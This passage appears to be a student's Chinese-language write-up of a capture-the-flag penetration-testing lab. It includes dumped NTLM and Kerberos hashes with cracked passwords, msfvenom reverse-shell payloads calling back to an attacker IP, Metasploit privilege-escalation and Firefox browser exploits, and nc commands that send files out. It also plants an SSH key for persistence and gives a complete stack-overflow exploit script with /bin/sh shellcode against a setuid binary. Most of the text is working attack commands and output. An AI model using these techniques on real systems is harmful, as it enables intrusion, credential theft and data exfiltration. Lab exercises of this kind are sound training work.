  Hash NTLM: e5e79029bfc66ae5749606969c1309cc
<!-- postscriptum -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 55bfb76f775805d2f2087afe4bd638a7

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEcrash_override
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 2e1bb6025fba051fd789d1b7716a4302b2b966f9e3b1d74c3982750ce5906360
      aes128_hmac       (4096) : 3a59ae3725919fef83dcf78de434a28d
      des_cbc_md5       (4096) : c70254ad51e092c4
    OldCredentials
      aes256_hmac       (4096) : 49e7d65d8bdb3e1e21beec979c6e922c1233a83397d3d7f05e83c470cd6031ae
      aes128_hmac       (4096) : 05554401083777770508bb6e01e99281
      des_cbc_md5       (4096) : 20791557d0f754f8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEcrash_override
    Credentials
      des_cbc_md5       : c70254ad51e092c4
    OldCredentials
      des_cbc_md5       : 20791557d0f754f8


RID  : 000003ed (1005)
User : lord_nikon
  Hash NTLM: 9c2faf998b5c49c464254081c968a8b8
<!-- grudge -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 247cd8e1153f9c5845b4f75e432ba231

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGElord_nikon
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 477b155ebd89d39085cfe89d98538c7fb122a49b7df79373f6d41888ded55fb2
      aes128_hmac       (4096) : fe31d16263c0a2cb5340947a300c9042
      des_cbc_md5       (4096) : cdfb2aea9b16ece9

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGElord_nikon
    Credentials
      des_cbc_md5       : cdfb2aea9b16ece9


RID  : 000003ee (1006)
User : the_plague
  Hash NTLM: eccb3adb3f867d725e360300bbd8eb77
<!-- knockemdown -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 98e1f5beb79cc58d6106fe1660e6cd66

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEthe_plague
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1f8caa1e909e827608492bfb7ade8402e528ab841ca62359cf211d3541a584c5
      aes128_hmac       (4096) : 45e3b1cc0d939375a9446d4d7d793046
      des_cbc_md5       (4096) : 8af4a1a1ae4a8acb

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEthe_plague
    Credentials
      des_cbc_md5       : 8af4a1a1ae4a8acb


RID  : 000003ef (1007)
User : mr_babbage
  Hash NTLM: 3bfeb0a86315d001b9ed8ce42b52e785
<!-- charismatic -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1f04a81c4235b740f8ed6760cdc1e657

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEmr_babbage
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 04b9beb873917c1ae5f4a6cfa6c1e14e11e49cb81dcf4ffdc3f62c0a595b1de9
      aes128_hmac       (4096) : 27ddf368e3d7a25d5e7e26b19da2e9e9
      des_cbc_md5       (4096) : 52fd3d76b64c4632

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEmr_babbage
    Credentials
      des_cbc_md5       : 52fd3d76b64c4632


RID  : 000003f0 (1008)
User : razor
  Hash NTLM: f996835f0091f58ce929f01de1e59fca
<!-- lovelily -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7c9560a12bcb4281dfdd0324bc267c88

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGErazor
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 774d92ad1f23fb530b12c1065574794ffad5f7667278dadf9848221bbc905859
      aes128_hmac       (4096) : 29959342c6771277a6f72d0613dfdd35
      des_cbc_md5       (4096) : 02ea75a86e45abcb

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGErazor
    Credentials
      des_cbc_md5       : 02ea75a86e45abcb


RID  : 000003f1 (1009)
User : zero_cool
  Hash NTLM: 548969bd05a16c6d42a71b0dd8f09129
<!-- archdemon -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b3c05cb5f85cec3d8949ffa32d9a59da

* Primary:Kerberos-Newer-Keys *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEzero_cool
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 5baf2d8f6c9a04ab0d8c090bb0c5a0dc05aa878b4f546e0358d4b51393955d72
      aes128_hmac       (4096) : 7079deda1cb9eb77ab30da7d483c369b
      des_cbc_md5       (4096) : b391c4759be0dfd0
    OldCredentials
      aes256_hmac       (4096) : 0c6b05f867a30be3734a09e165ac12f9cf76065da26504eedc46ba8ce3bfe36a
      aes128_hmac       (4096) : 2a49dfffb78d88fbe33cf3154bc859fa
      des_cbc_md5       (4096) : 041a344932bc02a7

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EARTH-CUSTOM-WINDOWS-IMAGEzero_cool
    Credentials
      des_cbc_md5       : b391c4759be0dfd0
    OldCredentials
      des_cbc_md5       : 041a344932bc02a7


RID  : 000003f2 (1010)
User : root
  Hash NTLM: 209c6174da490caeb422f3fa5a7ae634
<!-- admin -->
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 99ce3d393300684efee046797fe2c894

* Primary:Kerberos-Newer-Keys *
    Default Salt : EN2720-W11-LAZARUSroot
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d311be24368a24317d41759b3a8efc4aa1502d6dde6fb122d44a8cde93f30bad
      aes128_hmac       (4096) : 82afe0f427dd389776015330cbf218a2
      des_cbc_md5       (4096) : 6b46f83da145c486

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EN2720-W11-LAZARUSroot
    Credentials
      des_cbc_md5       : 6b46f83da145c486
```
通过在线解密得到的密码已经在上述注释中标出了

### telnet
通过hint得知某个地方的用户名密码可能会在另一台机器上用，以及telnet是一种类似ssh的服务，也是用户名密码登录。

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 10.0.0.0/20 -p 23 --open   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 22:52 EDT
Nmap scan report for 10.0.2.173
Host is up (0.064s latency).

PORT   STATE SERVICE
23/tcp open  telnet

Nmap scan report for 10.0.2.239
Host is up (0.040s latency).

PORT   STATE SERVICE
23/tcp open  telnet
```
.173打出的信息看起来安全防护比较严密，所以试试.239

```
┌──(kali㉿kali)-[~/Desktop/0926/mmk]
└─$ telnet 10.0.2.239
Trying 10.0.2.239...
Connected to 10.0.2.239.
Escape character is '^]'.
Ubuntu 18.04.6 LTS
en2720-w11-sea-turtle login: goldstein
Password: 

goldstein@en2720-w11-sea-turtle:~$ cd ..
goldstein@en2720-w11-sea-turtle:/home$ ls
flag{f9038f106c596f0efee8cdd1a552e649efd0ee84cca6b8}.jpg  goldstein  printer  sa_117153760595540998566  ubuntu

```
这里也可以把之前得到的用户名密码对做成词典使用haydra。

## Privilege escalation

Linux Privilege Check result:
```
[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...

    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!

    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system

    The following exploits are applicable to this kernel version and should be investigated as well
    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
```

### 生成payload

生成python后门，传输后运行，再进行meterpreter提权:`msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.0.7 LPORT=4444 -f raw -o payload.py`  
也可以生成elf文件：`msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.7 LPORT=4444 -f elf -o payload.elf`  
默认端口4444。

```shell
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.0.7
LHOST => 192.168.0.7
# msf6 exploit(multi/handler) > set LPORT 4444
```


失败的或许可用于windows的尝试：`getsystem`
```
meterpreter > getsystem
[-] The "getsystem" command requires the "priv" extension to be loaded (run: `load priv`)
meterpreter > load priv
Loading extension priv...
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (python/linux)
[-] The "priv" extension is supported by the following Meterpreter payloads:
[-]   - windows/x64/meterpreter*
[-]   - windows/meterpreter*
```

### local_exploit_suggester
```
meterpreter > run post/multi/recon/local_exploit_suggester 
  [*] 10.0.2.239 - Collecting local exploits for python/linux...
  [*] 10.0.2.239 - 167 exploit checks are being tried...
  [+] 10.0.2.239 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
  [+] 10.0.2.239 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
  [+] 10.0.2.239 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
  [+] 10.0.2.239 - exploit/linux/local/pkexec: The service is running, but could not be validated.
  [+] 10.0.2.239 - exploit/linux/local/su_login: The target appears to be vulnerable.
  [+] 10.0.2.239 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.
  [*] Running check method for exploit 51 / 51
  [*] 10.0.2.239 - Valid modules for session 1:
============================

 #Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.                                                                                          
 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.                                                                                          
 3   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.                                                                                          
 4   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.                                                                           
 5   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.                                                                                          
 6   exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.  

```

### 利用模块攻击
先把session置于背景，然后使用刚刚锁定的模组，配置options以后执行exploit。
(原因是这个模块需要SESSION参数，即基于一个已有的shell进行利用)
```
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y
msf6 exploit(multi/handler) > use exploit/linux/local/bpf_sign_extension_priv_esc
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > set LHOST 192.168.0.7
LHOST => 192.168.0.7
msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > set session 1
session => 1
msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > options

Module options (exploit/linux/local/bpf_sign_extension_priv_esc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION  1                yes       The session to run this module on


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.7      yes       The listen address (an interface may be specified)
   LPORT  9995             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto
msf6 exploit(linux/local/bpf_sign_extension_priv_esc) > exploit

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[*] Started reverse TCP handler on 192.168.0.7:9995 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.fP3T4kvSg' (250 bytes) ...
[*] Launching exploit ...
[*] Sending stage (3020772 bytes) to 10.0.2.239
[*] Meterpreter session 2 opened (192.168.0.7:9995 -> 10.0.2.239:44752) at 2022-09-30 05:54:35 -0400
[*] Cleaning up /tmp/.fP3T4kvSg and /tmp/.38jCUCjb ...

meterpreter > cd ~
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  3106  fil   2018-04-09 07:10:28 -0400  .bashrc
040755/rwxr-xr-x  4096  dir   2022-09-04 22:29:11 -0400  .composer
040755/rwxr-xr-x  4096  dir   2022-09-29 08:39:31 -0400  .config
040755/rwxr-xr-x  4096  dir   2022-09-29 05:33:31 -0400  .local
040755/rwxr-xr-x  4096  dir   2022-09-04 22:29:31 -0400  .npm
100644/rw-r--r--  148   fil   2015-08-17 11:30:33 -0400  .profile
040700/rwx------  4096  dir   2022-09-28 09:57:04 -0400  .ssh
100600/rw-------  5403  fil   2022-09-05 20:14:25 -0400  flag{6be6ef9fcba25bbe7593627b72008033459731da94fc8a}.jpg
```


## Traffic sniffing
### tcpdump
msf  @10.0.2.239
```
sudo tcpdump -c 500 -w turtle5.pcap
tcpdump: listening on ens4, link-type EN10MB (Ethernet), capture size 262144 bytes
200 packets captured
226 packets received by filter
0 packets dropped by kernel

sudo tcpdump -c 10 host 10.0.3.107
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens4, link-type EN10MB (Ethernet), capture size 262144 bytes
^C
```

nc@10.0.3.107
```
# sudo tcpdump -c 200 -w bear.pcap
sudo tcpdump -c 200 -w bear.pcap
tcpdump: listening on ens4, link-type EN10MB (Ethernet), capture size 262144 bytes
200 packets captured
416 packets received by filter
0 packets dropped by kernel

```

用wireshark查看。

发现两个机器都与10.0.7.6有交流。
10.0.7.6与10.0.2.239发送的都是DNS协议的包，而且10.0.7.6和10.0.3.107之间有HTTP请求和应答，由此推出10.0.2.239是DNS服务器，10.0.7.6向他查询cuiteur.ethhak是谁。

旗的依赖里面也提示这个flag从两个方向都能到。

turtle上面相关的包在查询cuiteur.ethhak，据此看看cuiteur（bear）在收发什么。找到一些HTTP包：
```
Hypertext Transfer Protocol
    GET /images/trait.png HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET /images/trait.png HTTP/1.1\r\n]
        Request Method: GET
        Request URI: /images/trait.png
        Request Version: HTTP/1.1
    Host: cuiteur-s14.ethhak\r\n
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:26.0) Gecko/20100101 Firefox/26.0\r\n
    Accept: image/png,image/*;q=0.8,*/*;q=0.5\r\n
    Accept-Language: en-US,en;q=0.5\r\n
    Accept-Encoding: gzip, deflate\r\n
    Referer: http://cuiteur-s14.ethhak/styles/cuiteur.css\r\n
    X-Ethhak-Flag-Content: flag{14ce18b7e724bb65090e1898418319d6f5a7f037a5c1ec}\r\n
    Connection: keep-alive\r\n
    \r\n
    [Full request URI: http://cuiteur-s14.ethhak/images/trait.png]
    [HTTP request 1/1]
```

## Client-side attacks
注意并不能用https://www.ettercap-project.org/，因为谷歌云环境没有链路层，不能使用ARP spoofing。
如果使用ettercap，可以参考这个来做DNS劫持：https://www.cnblogs.com/aq-ry/p/9379463.html


### DNS
几个知识点
1. /etc/resolv.conf  
该文件用来指定系统中DNS服务器的IP地址和一些相关信息
2. /etc/host.conf  
该文件决定进行域名解析时查找host文件和DNS服务器的顺序
3. 怎么查询本身有的dns服务
   1. 端口：常用的53端口是domain。
   2. 服务：`service --status-all | grep dns`
   3. 进程：`ps -aux | grep dns`
```  
$ ps -aux | grep dns
root      1032  0.0  0.8 317036  8476 ?        Ss   Oct07   0:08 php /usr/bin/php-dns
root      7693  0.0  0.1  11472  1056 ?        S    00:21   0:00 grep dns
```
查看/usr/bin/php-dns导向/etc/php-dns/dns_records.json
```
systemctl restart php-dns
```

### 浏览器攻击
参考：https://blog.csdn.net/l1028386804/article/details/86632106
但是这个auxiliary/server/browser_autopwn是针对windows的。
失败了

手动搜索可用漏洞，比如
`searchsploit firefox`和
`msf6> search exploit and firefox` (and不太好用，有些会搜不出来)
```
msf6 exploit(multi/browser/firefox_tostring_console_injection) > search exploit/multi/browser/firefox
Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/multi/browser/firefox_svg_plugin                  2013-01-08       excellent  No     Firefox 17.0.1 Flash Privileged Code Injection
   1  exploit/multi/browser/firefox_escape_retval               2009-07-13       normal     No     Firefox 3.5 escape() Return Value Memory Corruption
   2  exploit/multi/browser/firefox_proto_crmfrequest           2013-08-06       excellent  No     Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution
   3  exploit/multi/browser/firefox_jit_use_after_free          2020-11-18       manual     No     Firefox MCallGetProperty Write Side Effects Use After Free Exploit
   4  exploit/multi/browser/firefox_pdfjs_privilege_escalation  2015-03-31       manual     No     Firefox PDF.js Privileged Javascript Injection
   5  exploit/multi/browser/firefox_proxy_prototype             2014-01-20       manual     No     Firefox Proxy Prototype Privileged Javascript Injection
   6  exploit/multi/browser/firefox_webidl_injection            2014-03-17       excellent  No     Firefox WebIDL Privileged Javascript Injection
   7  exploit/multi/browser/firefox_queryinterface              2006-02-02       normal     No     Firefox location.QueryInterface() Code Execution
   8  exploit/multi/browser/firefox_tostring_console_injection  2013-05-14       excellent  No     Firefox toString console.time Privileged Javascript Injection
   9  exploit/multi/browser/firefox_xpi_bootstrapped_addon      2007-06-27       excellent  No     Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution
```   

只有exploit/multi/browser/firefox_webidl_injection用上了。记得根据options配置，
show payloads
set payload 2
set LHOST 192.168.0.7
set SRVPORT 80
set uripath / 意思是对请求首页的客户进行攻击？

```
ls /home/ubuntu/
nc 192.168.0.7 9995 < /home/ubuntu/flag{5d402eae2e4bd33b0d0e3435b6d3b7670b75f90ce6f7eb}.jpg
```
这个shell也很垃圾，不能切换目录而且一分钟左右就断掉。nc可以用。想用msf获得反向shell但是失败了，是因为防火墙的原因？
```
nc 192.168.0.7 9995 > /home/lord_nikon/m9997.elf
chmod +x /home/lord_nikon/m9997.elf
/home/lord_nikon/m9997.elf
```

## Binary exploitation
前面那个shell太垃圾了，在10.0.7.6=buckeye扫描自己，看到有可能是SSH开了后门端口
```
nmap localhost -p1-65535

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-08 15:49 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
Other addresses for localhost (not scanned): ::1
rDNS record for 127.0.0.1: localhost.localdomain
Not shown: 65533 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
52961/tcp open  unknown
```

### SSH登录
把公钥加入authorized_keys的两种方法：  
```
ls -la /home/lord_nikon/.ssh/
nc 192.168.0.7 9995 > /home/lord_nikon/.ssh/pub
cat /home/lord_nikon/.ssh/authorized_keys2

cat /home/lord_nikon/.ssh/pub >> /home/lord_nikon/.ssh/authorized_keys2
```
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpBpuqRvcSoJrGwixKmPl/IK0yx0jNRd6jTWsqjmeuSCEP3kUCbRY3r2n6Ns80U1HEvT6GCdPTtiFQi452Q4bGzELAKyrYY3++aglflTXh9UmRsvZilSJI3mhx8AHCVmVIhmAoQLGS+7oUC5bbNSi2sSMbgtrN2aiPpjx0n9Cx8XJtlHylVbnPap6tUCq+LHc/TCwYvvjdbrq8H0I6E+ELu5FF1MyM/r9sP4rlCiLfEUoGE21b006VT8+veE1Ey/EXZqLjz6pnmS7N7tDOKDr0KJe0/1V+RTQxXtlwPDY9Ka5vQuN5g6mZ0zjea94Y+ZcAVtmjBI0Yv+ROVLSUo9JY0AmUQGxmmvVIL9vzoV0OyQPFTi84mTqpDWt8t5AQbb01Nj9B0u1Ql7dhophsw0KkfX8ZA99DaEj62zuSqacNLirDx1bK51pWBIlQcdanUGQ7n01GaDdRW1KDDGnL9AouwuVa47S8+Cc9+cJ+XbyjYEjTCJHHEclVUcvCJqJjr4U= kali@kali" >> /home/lord_nikon/.ssh/authorized_keys2
```

可以登录
```
ssh lord_nikon@10.0.7.6 -p 52961 -o StrictHostKeyChecking=no
```
注意：
1. 通过尝试确认这台机器默认的认证公钥文件是authorized_keys2
2. buckeye开nc监听端口然后本地去连会有防火墙问题。本地监听。
3. -o StrictHostKeyChecking=no可以避免很多“ARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!”


### file命令
用于识别文件的类型，也可以用来辨别一些内容的编码格式。由于Linux系统并不是像Windows系统那样通过扩展名来定义文件类型，因此用户无法直接通过文件名来进行分辨。file命令则是为了解决此问题，通过分析文件头部信息中的标识来显示文件类型
```
lord_nikon@en2720-w11-buckeye:~$ ls -l
total 16
-r-sr-xr-- 1 root       lord_nikon 11168 Sep  5 06:00 neuromancer
-r--r--r-- 1 lord_nikon lord_nikon   816 Sep  5 06:00 neuromancer.c
lord_nikon@en2720-w11-buckeye:~$ file neuromancer
neuromancer: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=962e5c0af1542825ddfdaeeb6326e7e46606f316, with debug_info, not stripped
lord_nikon@en2720-w11-buckeye:~$ file neuromancer.c
neuromancer.c: C source, ASCII text
```

### checksec
git clone https://github.com/slimm609/checksec.sh.git
然后把checksec传到目标机器上。
```
nc 192.168.0.7 9995 > checksec.sh
chmod 700 checksec.sh
./checksec.sh --file="./neuromancer"

```
No defences to speak of either.

找出哪个有效负载长度会溢出内存。
metasploit提供了生成pattern的脚本：
https://www.offensive-security.com/metasploit-unleashed/writing-an-exploit/

### 在线调试
创建x.py(原名:locke_lamora.py)
```python
import sys
import struct

alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
test = print((alphabet + alphabet[::-1])*4)
```

运行`lord_nikon@en2720-w11-buckeye:~$ gdb neuromancer`之后打入:
```
(gdb)r $(python3 x.py)
Starting program: /home/lord_nikon/neuromancer $(python3 x.py)
python3: can't open file 'x.py': [Errno 2] No such file or directory
Give me a string to check if it is palindrome
[Inferior 1 (process 6449) exited with code 01]
(gdb) r $(python3 ./.7/x.py)
Starting program: /home/lord_nikon/neuromancer $(python3 ./.7/x.py)
The string "ABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBAABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBAABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBAABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBA" is palindrome and was written to the memory address 0x7fffffffe360.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400694 in main (argc=2, argv=0x7fffffffe4d8) at /home/lord_nikon/neuromancer.c:48
48      }
(gdb) info frame
Stack level 0, frame at 0x7fffffffe400:
 rip = 0x400694 in main (/home/lord_nikon/neuromancer.c:48); saved rip = 0x4443424141424344
 source language c.
 Arglist at 0x45464748494a4b4c, args: argc=2, argv=0x7fffffffe4d8
 Locals at 0x45464748494a4b4c, Previous frame's sp is 0x7fffffffe400
 Saved registers:
  rbp at 0x7fffffffe3f0, rip at 0x7fffffffe3f8
```
得到payload length = 158


创建x2.py
```python
import sys
import struct

start = 0x7fffffffe360
address = start + 0xB

address_little = struct.pack('Q', address)
address_big = struct.pack('>Q', address)

shellcode = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'

padchar = b'\x90' # no-op, NOP-slide into our code
padding_length = 25 # 158 - shellcode*2 - address*2, addr occupy 6 bytes other than 8
padding = padchar * padding_length

payload = address_big + padding + shellcode + shellcode[::-1] + padding + address_little

sys.stdout.buffer.write(payload.strip(b'x00'))

```

```
(gdb) r $(python3 ./.7/x2.py)
Starting program: /home/lord_nikon/neuromancer $(python3 ./.7/x2.py)
/bin/bash: warning: command substitution: ignored null byte in input
The string "����k�������������������������H1��iH1�H��/bin/shH�SH��H1�PWH���;j_j<XX<j_j;���HWP�1H��H��Hhs/nib/��H�1Hi��1H�������������������������k����" is palindrome and was written to the memory address 0x7fffffffe3a0.

Program received signal SIGILL, Illegal instruction.
0x00007fffffffe36b in ?? ()
```

根据运行结果迭代测试，在x2.py中修改这一行
start = 0x7fffffffe3b0              #  0x7fffffffe3a0 # 0x7fffffffe360

lord_nikon@en2720-w11-buckeye:~$ ./neuromancer $(python3 ./.7/x2.py)
成功


* Shellcode来源：
https://shell-storm.org/shellcode/files/shellcode-77.php
shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"


## Remote exploitation
### 找新的主机
从bueckeye出发扫描。
首先从kali上是扫不到.4.0/22这段的。
发现一些值得注意的主机：

Nmap scan report for 10.0.6.133
Host is up (0.00046s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap scan report for 10.0.6.168
Host is up (0.00024s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh

Nmap scan report for 10.0.7.6
Host is up (0.00030s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.7.73
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 10.0.7.124
Host is up (0.033s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
23/tcp open  telnet


- 首先ftp的问题
```
lord_nikon@en2720-w11-buckeye:~$ ftp 10.0.6.168
Connected to 10.0.6.168.
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
ftp> ls
Not connected.
```
网上搜索知道not connected就是防火墙的原因……

- 然后看看http
跟一台gopher://follow-the-white-rabbt.matrix/有关，感觉是云相关的东西。

- 然后telnet
看起来防守很严

- 那就只剩那个奇怪的10.0.6.133了

### Samba
netbios-ssn（网络基本输入输出系统）
Server Message Block 协议。与其他标准的TCP/IP协议不同，SMB协议是一种复杂的协议，因为随着Windows计算机的开发，越来越多的功能被加入到协议中去了，很难区分哪些概念和功能应该属于Windows操作系统本身，哪些概念应该属于SMB 协议。因为该协议很复杂，所以是微软历史上出现安全问题最多的协议。

最简单的方法，nmap扫描其固定开放的端口139,445，但是无法准确判断其为windows系统。

进行高级扫描：
```
lord_nikon@en2720-w11-buckeye:~$ nmap 10.0.6.133 -p139,445 --script=smb-os-discovery.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-11 16:27 CEST
Nmap scan report for 10.0.6.133
Host is up (0.0020s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.4-Ubuntu)
|   Computer name: en2720-w11-cloud-hopper
|   NetBIOS computer name: EN2720-W11-CLOUD-HOPPER\x00
|   Domain name: \x00
|   FQDN: en2720-w11-cloud-hopper
|_  System time: 2022-10-11T16:27:59+02:00
```
**这到底是windows还是linux？？？**
扫描windows系统smb协议是否有漏洞：由于从NMAP 6.49beta6开始，smb-check-vulns.nse脚本被取消了。它被分为smb-vuln-conficker、smb-vuln-cve2009-3103、smb-vuln-ms06-025、smb-vuln-ms07-029、smb-vuln-regsvc-dos、smb-vuln-ms08-067这六个脚本。用户根据需要选择对应的脚本。如果不确定执行哪一个，可以使用smb-vuln-*.nse来指定所有的脚本文件，进行全扫描。

```
lord_nikon@en2720-w11-buckeye:~$ nmap 10.0.6.133 -p139,445 --script=smb-vuln-*

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-11 16:35 CEST
Nmap scan report for 10.0.6.133
Host is up (0.0026s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

**Attention**:
建议的模块可以在/usr/share/nmap/scripts/, 使用方法：
